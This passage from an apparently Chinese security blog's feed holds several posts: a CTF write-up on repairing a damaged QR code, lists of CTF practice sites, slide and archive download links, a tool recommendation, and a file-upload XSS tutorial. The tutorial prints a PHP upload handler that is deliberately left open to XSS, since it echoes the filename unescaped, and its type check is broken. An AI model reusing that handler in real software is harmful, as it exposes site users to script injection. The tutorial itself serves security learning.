      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r决定给他的城堡添加一个额外的先进安全身份检验层。他的访问密钥是一个二维码且是唯一的，并一直放在他的钱包里。然而不幸，当他离开他的城堡护城河时一不小心把二维码弄到了河里，二维码被弄湿损毁了。现在他不能回到自己的城堡，迫切需要一个黑客帮助，他在<a href="http://singapore.craigslist.com.sg/" target="_blank" rel="external">craigslist</a>网站发布了求助，描述了情况，这是你露一手的绝佳机会。</p><p>这是损毁的二维码</p></blockquote><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2128424996.png" alt="Backdoor-CTF-2013-Forensics-150-wet_QR.png"></p><blockquote><p>flag是隐藏在二维码里密码的最后13个字符的MD5值。</p></blockquote><a id="more"></a><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>使用PS打开二维码，调整图片色阶，使图片大致恢复原样，从图中大致可以推出图片做了蒙版处理。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3486161462.jpg" alt="二维码调整色阶.jpg"></p><p>所以我们调整图像的阈值，使蒙版处理效果失效，让图像恢复正常。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1543716028.jpg" alt="二位码调整阈值.jpg"></p><p>根据上图和二维码一般格式中可推出二维码中间以下部分可能做了反相处理，所以我们将图像中间一下部分再做一次反相让图像恢复原样。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3807017392.jpg" alt="二维码调整反相.jpg"></p><p>使用PS修复二维码的文章可以参考：<a href="http://www.zhihu.com/question/22387101" target="_blank" rel="external">如何用PS修复一张模糊的二维码？</a></p><p>尝试着<a href="http://jiema.wwei.cn/" target="_blank" rel="external">解码</a>，解码结果：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2807078705.jpg" alt="二维码解码结果.jpg"></p><p>计算出MD5值<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo sdslabs.co.in | md5sum</div><div class="line">b149a901f5ca408a81fe8f36f7c717f6  -</div><div class="line">root@kali:~# echo -n sdslabs.co.in | md5sum</div><div class="line">5d75674e66e0b3d57c31efe75099408e  -</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> misc </tag>
            
            <tag> forensics </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[干货-2016暑期学校软件与移动智能系统安全PPT]]></title>
      <url>/2016/07/30/%E5%B9%B2%E8%B4%A7-2016%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E8%BD%AF%E4%BB%B6%E4%B8%8E%E7%A7%BB%E5%8A%A8%E6%99%BA%E8%83%BD%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8PPT/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很感谢<a href="https://loccs.sjtu.edu.cn/summerschool/" target="_blank" rel="external">上海交通大学计算机系</a>分享PPT资源，满满都是优质的干货，我这里把全部的PPT打包，欢迎大家下载学习！</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/07/4096893046.gif" alt="软件与移动智能系统安全.gif"></p><h2 id="0x01-主题"><a href="#0x01-主题" class="headerlink" title="0x01 主题"></a>0x01 主题</h2><figure class="highlight plain"><figcaption><span>plain</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">密码学误用和白盒密码 	                王磊（特别研究员） 	</div><div class="line">二进制逆向自动化分析技巧 	                李卷孺（博士） 	</div><div class="line">嵌入式设备安全分析技巧与实例                刘穆清 	</div><div class="line">关于Android Root的二三事 	                许文（0ops前副队长） 	</div><div class="line">国内外安全竞赛简介 	                许文（0ops前副队长） 	</div><div class="line">代码反混淆简介 	                        谢海疆 	</div><div class="line">TrustZone和安全操作系统 	                夏虞斌（博士，讲师）/利文浩（博士） 	</div><div class="line">二进制漏洞利用与shellcode                 杨坤（博士，Blue-lotus队长） 	</div><div class="line">Smart Device Security 	                杨坤（博士，Blue-lotus队长） 	</div><div class="line">Android 安全综述 	                束骏亮（博士） 	</div><div class="line">Android APP安全分析 	                李博栋（博士） 	</div><div class="line">Android APP保护 	                        杨文博（博士） 	</div><div class="line">从IV=0说起：Android应用的密码学安全问题浅析 刘慧（博士） 	</div><div class="line">多方认证问题安全研究——以Android平台为例 	王晖（博士）</div></pre></td></tr></table></figure><h2 id="0x02-下载"><a href="#0x02-下载" class="headerlink" title="0x02 下载"></a>0x02 下载</h2><p>链接: <a href="http://pan.baidu.com/s/1kV8loI7" target="_blank" rel="external">http://pan.baidu.com/s/1kV8loI7</a> 密码: 3hb3</p>]]></content>
      
        <categories>
            
            <category> 干货分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 移动平台安全 </tag>
            
            <tag> 密码系统安全 </tag>
            
            <tag> 软件与移动智能系统安全 </tag>
            
            <tag> 二进制代码安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[入CTF坑必不可少的地方-保持更新]]></title>
      <url>/2016/07/30/%E5%85%A5CTF%E5%9D%91%E5%BF%85%E4%B8%8D%E5%8F%AF%E5%B0%91%E7%9A%84%E5%9C%B0%E6%96%B9-%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/05/4242872726.png" alt="ctf.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>没有交易，没有买卖，没有排名，纯属分享:p</p><h2 id="0x01-CTF介绍"><a href="#0x01-CTF介绍" class="headerlink" title="0x01 CTF介绍"></a>0x01 CTF介绍</h2><p><a href="http://blog.idf.cn/2015/02/ctf-field-guide/" target="_blank" rel="external">CTF领域指南</a><br><a href="http://tieba.baidu.com/p/3933947157" target="_blank" rel="external">CTF介绍大全</a><br><a href="https://ctftime.org/event/list/upcoming" target="_blank" rel="external">CTF赛事预告</a><br><a id="more"></a></p><h2 id="0x02-CTF练习"><a href="#0x02-CTF练习" class="headerlink" title="0x02 CTF练习"></a>0x02 CTF练习</h2><p><strong>BIN:</strong><br><a href="http://reversing.kr/" target="_blank" rel="external">reversing</a><br><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable</a><br><a href="http://crackmes.de/" target="_blank" rel="external">crackmes</a><br><a href="http://exploit-exercises.com/" target="_blank" rel="external">exploit-exercises</a><br><a href="http://overthewire.org/" target="_blank" rel="external">overthewire</a><br><a href="https://io.netgarage.org" target="_blank" rel="external">netgarage</a><br><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="external">bin干货</a><br><a href="http://www.52pojie.cn/forum-67-1.html" target="_blank" rel="external">2014CrackMe大赛</a><br><a href="http://www.52pojie.cn/forum-71-1.html" target="_blank" rel="external">吾爱破解2016安全挑战赛</a><br><a href="http://bbs.pediy.com/forumdisplay.php?f=109" target="_blank" rel="external">看雪安全论坛历年安全大赛</a></p><p><strong>SQL:</strong><br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-labs</a><br><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="external">RedTigers Hackit</a></p><p><strong>XSS:</strong><br><a href="http://xss.pkav.net/xss/" target="_blank" rel="external">乌云XSS互动学习平台</a><br><a href="http://prompt.ml/" target="_blank" rel="external">prompt</a><br><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">XSS Challenges</a><br><a href="http://escape.alf.nu/" target="_blank" rel="external">escape</a><br><a href="https://xss-game.appspot.com/" target="_blank" rel="external">xss-game</a></p><p><strong>国内综合练习：</strong><br><a href="http://www.sangebaimao.com/challenge/list" target="_blank" rel="external">三个白帽</a><br><a href="http://hackinglab.cn/" target="_blank" rel="external">网络信息安全攻防学习平台</a><br><a href="http://captf.com/" target="_blank" rel="external">CTF题目</a><br><a href="http://cafebabe.cc/nazo/" target="_blank" rel="external">脑洞开发</a><br><a href="http://1111.segmentfault.com/" target="_blank" rel="external">光棍节程序员闯关秀</a><br><a href="http://www.helloisa.com/test/" target="_blank" rel="external">ISA Test</a><br><a href="http://www.fj543.com/hack/" target="_blank" rel="external">黑客丛林之旅</a><br><a href="http://monyer.com/game/game1/" target="_blank" rel="external">梦之光芒小游戏</a><br><a href="http://oj.xctf.org.cn/" target="_blank" rel="external">XCTF_OJ练习平台</a><br><a href="http://hackgame.blackbap.org/" target="_blank" rel="external">习科黑客游戏</a><br><a href="http://ctf.3sec.cn/" target="_blank" rel="external">Jlu.CTF</a><br><a href="http://www.baimaoxueyuan.com/ctf" target="_blank" rel="external">白帽学院CTF挑战赛</a><br><a href="http://www.ichunqiu.com/tiaozhans" target="_blank" rel="external">i春秋CTF挑战</a><br><a href="http://ctf.idf.cn/" target="_blank" rel="external">idf 实验室</a><br><a href="http://ctf.moonsos.com/pentest/index.php" target="_blank" rel="external">米安CTF</a><br><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="external">合天CTF</a><br><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="external">西普CTF</a><br><a href="http://hkyx.myhack58.com/" target="_blank" rel="external">红客闯关游戏</a><br><a href="http://202.108.211.5/" target="_blank" rel="external">实训竞赛系统</a></p><p><strong>国外综合练习:</strong><br><a href="http://www.wechall.net/" target="_blank" rel="external">wechall</a><br><a href="http://insight-labs.org/" target="_blank" rel="external">insight-labs</a><br><a href="http://webhacking.kr/" target="_blank" rel="external">webhacking</a><br><a href="http://wargame.kr/" target="_blank" rel="external">wargame</a><br><a href="http://canyouhack.it/" target="_blank" rel="external">canyouhack</a><br><a href="http://hackit.sinaapp.com/" target="_blank" rel="external">hackit</a><br><a href="http://webhacking.kr/" target="_blank" rel="external">webhacking</a><br><a href="http://fun.coolshell.cn/" target="_blank" rel="external">coolshell</a><br><a href="http://ringzer0team.com/challenge" target="_blank" rel="external">ringzer0team</a><br><a href="https://backdoor.sdslabs.co/" target="_blank" rel="external">backdoor</a><br><a href="http://smashthestack.org/" target="_blank" rel="external">smashthestack</a><br><a href="http://overthewire.org/wargames/" target="_blank" rel="external">overthewire</a><br><a href="https://w3challs.com/" target="_blank" rel="external">w3challs</a><br><a href="https://chall.stypr.com/?chall" target="_blank" rel="external">chall.stypr</a><br><a href="https://pentesterlab.com/" target="_blank" rel="external">pentesterlab</a><br><a href="https://id0-rsa.pub" target="_blank" rel="external">id0-rsa</a></p><h2 id="0x03-CTF-writeup-WP"><a href="#0x03-CTF-writeup-WP" class="headerlink" title="0x03 CTF-writeup(WP):"></a>0x03 CTF-writeup(WP):</h2><p>各种搜索:ctf writeup<br><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="external">乌云WP</a><br><a href="http://bobao.360.cn/ctf/" target="_blank" rel="external">360安全播报WP</a><br><a href="https://github.com/ctfs/" target="_blank" rel="external">github WP</a><br><a href="http://sec.yka.me/" target="_blank" rel="external">CTF Writeup Summary</a><br><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="external">Write Ups</a></p><h2 id="0x04-后话"><a href="#0x04-后话" class="headerlink" title="0x04 后话"></a>0x04 后话</h2><p>学习的地方很多，不能一一列举，一些其他优秀的平台没有提到，欢迎大家补充:P</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf writeup </tag>
            
            <tag> XSS </tag>
            
            <tag> ctf练习 </tag>
            
            <tag> reverse </tag>
            
            <tag> pentest </tag>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2016 JSRC乌托邦广州站沙龙议题PPT]]></title>
      <url>/2016/07/28/2016-JSRC%E4%B9%8C%E6%89%98%E9%82%A6%E5%B9%BF%E5%B7%9E%E7%AB%99%E6%B2%99%E9%BE%99%E8%AE%AE%E9%A2%98PPT/</url>
      <content type="html"><![CDATA[<h2 id="0x00-议题"><a href="#0x00-议题" class="headerlink" title="0x00 议题"></a>0x00 议题</h2><p>议题一 以攻为守的情报分析 张佳发</p><p>议题二 基于威胁情报的业务逻辑漏洞分析V0.2 吴灵敏</p><p>议题三 当威胁情报遇上业务安全 张洪</p><a id="more"></a><h2 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h2><p>百度云盘: <a href="http://pan.baidu.com/s/1eRRbMt8" target="_blank" rel="external">http://pan.baidu.com/s/1eRRbMt8</a><br>提取密码：trva</p><p>0x02 议题介绍</p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827139&amp;idx=1&amp;sn=909ccb72b902e9d8678c32f603219e1e&amp;scene=23&amp;srcid=0728dLqC1jsDGUm2K9x37iVw#rd" target="_blank" rel="external">传送门</a></p>]]></content>
      
        <categories>
            
            <category> 干货分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 2016 jsrc ppt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[史上最强适合安全爱好者的截图神器Snipaste]]></title>
      <url>/2016/07/28/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%BC%BA%E9%80%82%E5%90%88%E5%AE%89%E5%85%A8%E7%88%B1%E5%A5%BD%E8%80%85%E7%9A%84%E6%88%AA%E5%9B%BE%E7%A5%9E%E5%99%A8Snipaste/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>编写文档几乎是与计算机和互联网接触的工作者的日常，在信息安全领域中，信息安全工程师编写渗透测试报告、漏洞分析文档是必备技能，同时也是家常便饭，文档编写时经常需要相关的截图来说明解释，而一款顺手强大、绿色免费截图神器正是我们作为安全研究爱好者所强烈渴求的。偶然地机会在<a href="http://www.v2ex.com/t/295433" target="_blank" rel="external">v2ex</a>看到<a href="http://www.v2ex.com/member/levie" target="_blank" rel="external">levie</a>开发的截图神器Snipaste，跟着操作学习了一般，给我的感觉就是从未用过这么适合安全研究爱好者的截图神器，特别是它除一般截图所具有的功能之外的精确控制截图范围特点、代码选取转为图片特色、强大的图片编辑功能，总之是一款很赞的适合安全爱好者的截图神器，在此向作者说声感谢！</p><a id="more"></a><p><strong>精确控制截图范围:</strong><br><img src="https://www.hackfun.org/usr/uploads/2016/07/4187402051.gif" alt="精确控制截图范围.gif"></p><p><strong>代码选取转为图片:</strong><br><img src="https://www.hackfun.org/usr/uploads/2016/07/2123877306.gif" alt="代码转为图片.gif"></p><p><strong>强大的图片编辑:</strong><br><img src="https://www.hackfun.org/usr/uploads/2016/07/1590710998.gif" alt="图片编辑功能.gif"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/696746955.gif" alt="图片文字注释编辑.gif"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/1591114699.gif" alt="马克笔、马赛克、高斯模糊、橡皮擦功能.gif"></p><h2 id="0x01-更多"><a href="#0x01-更多" class="headerlink" title="0x01 更多"></a>0x01 更多</h2><p>这里只是做一个简单的分享，如果想了解Snipaste更多特性和说明的话可以参考作者<a href="http://www.v2ex.com/member/levie" target="_blank" rel="external">levie</a>在v2ex上发表的文章:<a href="http://www.v2ex.com/t/295433" target="_blank" rel="external">Snipaste - 开发了三年的截图工具，但不只是截图</a>以及工具的<a href="http://zh.snipaste.com/help.html" target="_blank" rel="external">文档</a>说明。</p><p>神器下载可以去Snipaste<a href="http://zh.snipaste.com/" target="_blank" rel="external">官网</a>，目前有Windows版本，Mac版本、Linux版本作者在之后会陆续开发推出！</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 截图神器snipaste </tag>
            
            <tag> snipaste下载 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wooyun drops乌云知识库全部文章打包离线下载]]></title>
      <url>/2016/07/27/wooyun-drops%E4%B9%8C%E4%BA%91%E7%9F%A5%E8%AF%86%E5%BA%93%E5%85%A8%E9%83%A8%E6%96%87%E7%AB%A0%E6%89%93%E5%8C%85%E7%A6%BB%E7%BA%BF%E4%B8%8B%E8%BD%BD/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>乌云网是一个安全研究者集聚地，是一个非常值得推荐学习的地方，特别是各路大牛分享技术文章的乌云知识库，由于近几天乌云在进行升级，导致很多小伙伴看不了乌云知识库里的技术文章，所以分享一份来自<a href="https://www.zhihu.com/people/bei-ji-xiong-zer0" target="_blank" rel="external">JmNkS</a>的乌云知识库全部文章包，一共是1157篇，赶紧下载去学习一波吧！另外正如乌云所说:与其听信谣言不如相信乌云，相信过不了多久乌云会正常回归！</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/07/3319622725.png" alt="wooyun drops乌云知识库全部文章.png"></p><h2 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h2><p><a href="https://github.com/4ido10n/wooyun-drops-all-articles-package" target="_blank" rel="external">https://github.com/4ido10n/wooyun-drops-all-articles-package</a></p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 乌云知识库 </tag>
            
            <tag> wooyun drops </tag>
            
            <tag> 乌云知识库离线下载 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS姿势-文件上传XSS复现学习]]></title>
      <url>/2016/07/26/XSS%E5%A7%BF%E5%8A%BF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>偶然看到国外大神<a href="https://twitter.com/brutelogic" target="_blank" rel="external">brutelogic</a>的XSS学习记录<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">博客</a>，博客里有许多XSS方面的干货文章，非常值得深入学习和研究，其中的一篇文章<a href="http://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="external">File Upload XSS</a>，国内也有人翻译过：<a href="http://www.freebuf.com/articles/web/101843.html" target="_blank" rel="external">技术分享：如何利用文件上传执行XSS？</a> ，所以便跟着学习一波，做一下记录。另外我一直崇拜的<a href="http://www.bugs.cc/" target="_blank" rel="external">Black-Hole</a>表哥也写了一个<a href="http://www.freebuf.com/author/black-hole" target="_blank" rel="external">XSS的原理分析与解剖以及挖掘</a>系列，推荐去涨一波姿势。</p><h2 id="0x01-文件上传XSS"><a href="#0x01-文件上传XSS" class="headerlink" title="0x01 文件上传XSS"></a>0x01 文件上传XSS</h2><p>在说文件上传XSS之前我们先把什么是XSS这个问题搞清楚，XSS跨站脚本(Cross-Site Scripting)是一种经常出现在Web应用程序中的安全漏洞，一般是由于Web应用程序对用户的输入过滤不足或过滤被绕过而产生的。攻击者利用此类漏洞把恶意代码(通常包括HTML代码和客户端JavaScript脚本)通过各种方式注入到网页(可以是网页中其他媒体为攻击载体，如：图片)之中，当其他用户浏览被注入恶意代码的网页时，就会触发执行其中的恶意代码，从而达到受害者的Cookie被窃取、(浏览器)会话被劫持、钓鱼欺骗、传播XSS蠕虫、网页挂马或植入广告、触发受害者非自愿恶意操作如删除文章，控制受害者机器向其他浏览器发起恶意攻击、结合其他漏洞如CSRF实施进一步攻击、在渗透网站过程提升用户权限等等攻击者目的，因此通常我们称这种攻击方式为XSS跨站脚本攻击。根据XSS特性和利用方法主要分为反射型跨站脚本、持久型跨站脚本XSS、这里讲的文件上传XSS主要是反射型的，这里我所理解的文件上传XSS主要是指通过以上传的文件(形如图片文件)作为精心构造好的XSS恶意代码payload攻击载体的形式来实现XSS攻击。总的来说原理一样，不过实现的方式不一样。</p><h2 id="0x01-文件名方式"><a href="#0x01-文件名方式" class="headerlink" title="0x01 文件名方式"></a>0x01 文件名方式</h2><p>我们知道windows与linux文件命名有所差别，windows下文件名不能包含 / \ : * ? “ &lt; &gt; | 字符，而linux下是可以出现除 / 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。</p><p>比如上传处理代码是这样的：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$html = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>])) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'Filename Upload XSS Demo'</span>;</div><div class="line">    $target_path = <span class="string">"uploads/"</span>;</div><div class="line">    $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</div><div class="line">    $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</div><div class="line">    $uploaded_type = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'type'</span>];</div><div class="line">    $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">    <span class="keyword">echo</span> $uploaded_type;</div><div class="line">    <span class="keyword">if</span> ($uploaded_type == <span class="string">"image/jpeg &amp;&amp; $uploaded_size &lt; 100000000"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= <span class="string">'Your image was not uploaded.'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> $html;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= $target_path . <span class="string">' succesfully uploaded!'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> $html;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p>从代码中可看出只是简单地对文件类型和文件大小进行了判断，并没有对文件名进行处理。</p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[黑客宝典 -《安全档案（第一期）》：逆向工程与WEB安全 下载及征稿]]></title>
      <url>/2016/07/23/%E9%BB%91%E5%AE%A2%E5%AE%9D%E5%85%B8-%E3%80%8A%E5%AE%89%E5%85%A8%E6%A1%A3%E6%A1%88%EF%BC%88%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%89%E3%80%8B%EF%BC%9A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8EWEB%E5%AE%89%E5%85%A8-%E4%B8%8B%E8%BD%BD%E5%8F%8A%E5%BE%81%E7%A8%BF/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很荣幸的作为参编参与《安全档案》的制作，现在《安全档案（第一期）》：逆向工程与WEB安全终于发布啦！</p><p>筹划良久，爱安全与众技术大拿共同打造的新信息安全技术文献——《安全档案（第一期）》：逆向工程与WEB安全正式放送给大家！</p><p>这一期满满72页的干货，有逆向工程大牛深入浅出的漏洞分析，有Web安全大触独具特色的研究成功，在此衷心地感谢他们辛勤的付出！</p><p>欢迎大家阅读和分享，同时也欢迎大家向安全档案投稿！</p><p>在此由衷的感谢《白帽子讲浏览器安全》作者Blast、phithon、jas0n、hero、k0sh1等对稿件的授权，以及爱安全团队的每一个伙伴齐心协力。</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/07/3227039285.jpg" alt="《安全档案（第一期）》：逆向工程与WEB安全.jpg"></p><h2 id="0x01-投稿"><a href="#0x01-投稿" class="headerlink" title="0x01 投稿"></a>0x01 投稿</h2><p>《安全档案（第一期）》发布之后，受到安全圈小伙伴的热情点赞，说从此又多了一本黑客宝典，在此谢谢小伙伴们的支持，同时《安全档案》也需要小伙伴们发扬黑客精神:开放、自由、分享，积极投稿分享技术和知识，热枕欢迎各位读者和投稿人加入QQ群：566948617与我们反馈交流，和我们一起放送更加高质量更干货的安全档案！(Ps：投稿还会有神秘礼物哦！)</p><p>投稿邮箱:article@ixsec.org</p><h2 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h2><p><a href="http://www.ixsec.org/wp-content/uploads/2016/07/ixsec.org_2016-07-07_06-53-27.pdf" target="_blank" rel="external">《安全档案（第一期）》：逆向工程与WEB安全</a></p>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> 黑客宝典 </tag>
            
            <tag> 《安全档案（第一期）》：逆向工程与web安全 </tag>
            
            <tag> 爱安全团队 </tag>
            
            <tag> 《安全档案》下载和征稿 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[干货-信息安全甲方乙方理解和职业群岗位脑图]]></title>
      <url>/2016/07/16/%E5%B9%B2%E8%B4%A7-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%94%B2%E6%96%B9%E4%B9%99%E6%96%B9%E7%90%86%E8%A7%A3%E5%92%8C%E8%81%8C%E4%B8%9A%E7%BE%A4%E5%B2%97%E4%BD%8D%E8%84%91%E5%9B%BE/</url>
      <content type="html"><![CDATA[<h2 id="0x00-甲方乙方"><a href="#0x00-甲方乙方" class="headerlink" title="0x00 甲方乙方"></a>0x00 甲方乙方</h2><p>随着社会的发展，我们国家越来越重视信息安全，国内许多大厂商也越来越重视企业的信息系统的安全防范，对于我们从事这行的小伙伴来说无疑是个好消息！不过，许多刚刚接触这行的小伙伴并不太了解信息安全方面有些什么岗位，所以给小伙伴分享信息安全职业群岗位脑图，主要是关于甲方企业的岗位，说到甲方企业，那么在信息安全里所谓的甲方和乙方怎么理解呢？通俗理解就是甲方给需求，乙方给服务，当然这不是绝对的，只是大致是这样。举个例子，比如，像京东、携程、小米，华为等公司就属于甲方，而像启明星辰、绿盟、知道创宇这些公司就属于乙方，还有一些公司甲方乙方性质都具有，360就是典型的公司，既需要给其他公司需求，也对其他公司提供安全服务。</p><p>下面是引用<a href="http://www.zhihu.com/question/21434826/answer/33930937" target="_blank" rel="external">hblf</a>对于甲乙方自己理解：</p><blockquote><p>在乙方：更专注某一领域的技术，在这个领域里技术研究的更深入。毕竟目前没有哪家乙方公司敢说自己的产品线覆盖了网络安全的所有领域，有侧重攻防漏洞的（比如绿盟），有侧重web安全的（比如知道创宇），有侧重恶意代码的（比如各杀毒软件公司），在任何一家公司做乙方的技术，都有更多资源在这个领域里挖的更深，甚至成为专家。但是显而易见，在创宇可能你就不会对恶意代码研究那么多，在mcafee你可能就没机会深入玩玩DDoS。</p><p>在甲方：甲方的安全工程师首先要求懂业务，要懂得把各种安全技术如何恰当合理的应用在自己服务的企业并创造价值。安全技术千千万，能与公司业务流程完美融合发挥效力的，需要的不仅是对技术细节的了解，更需要合理应用和取舍。在甲方你会因为项目的原因，有机会接触不同层次的乙方公司及工程师，接触的人更多，学到的东西也更多。在甲方也许更能体会“三分技术七分管理”的含义。并不是说这句话有多么多么金科玉律，但离开安全管理玩技术，效果也会打折扣。</p><p>总之，甲方的面更宽，但深入度明显不够，同时，不同公司业务形态不同，在A甲方做的好未必能完美移植到B甲方。</p></blockquote><p>最后希望小伙伴们都能够找到自己的定位，并为之奋斗，不用多久，相信你就会升职加薪、当上总经理、出任CEO、迎娶白富美、走上人生巅峰，是不是有点小激动2333。</p><h2 id="0x01-脑图"><a href="#0x01-脑图" class="headerlink" title="0x01 脑图"></a>0x01 脑图</h2><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/07/2700899310.jpg" 